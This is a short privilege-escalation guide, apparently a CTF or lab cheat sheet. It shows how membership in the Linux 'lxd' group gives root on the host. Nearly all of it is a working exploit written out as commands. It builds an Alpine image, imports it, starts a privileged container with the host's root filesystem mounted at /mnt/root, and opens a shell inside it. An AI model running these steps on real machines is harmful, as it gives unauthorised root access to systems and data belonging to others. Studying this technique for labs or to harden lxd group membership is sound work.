Check for user group memberships by means of the shell command `id`.

### LXD group 

LXD is a system container and virtual machine manager. If a local user belongs to "lxd" group, then it could instantly escalate the privileges to root on the host operating system.

On the attacker machine:

- Download build-alpine:

      wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
      
- Execute the script that will build an Alpine image as compressed `tar.gz` file:

      sudo bash build-alpine
      
- Transfer the `tar.gz` file to the target machine.


On the victim machine:

- Add the Alpine image as an LXD image:

      lxc image import ./alpine-v3.15-x86_64-20220114_1458.tar.gz --alias alpine_image

- Check the imported image (you should see an image called "alpine_image"):

      lxc image list
      
- Exploit:

      lxc init alpine_image ignite -c security.privileged=true
      lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
      lxc start ignite
      lxc exec ignite /bin/sh
      
Once inside the container, navigate to `/mnt/root` to see the whole filesystem of the victim machine.
You could access to `/mnt/root/root` to retrieve a flag.
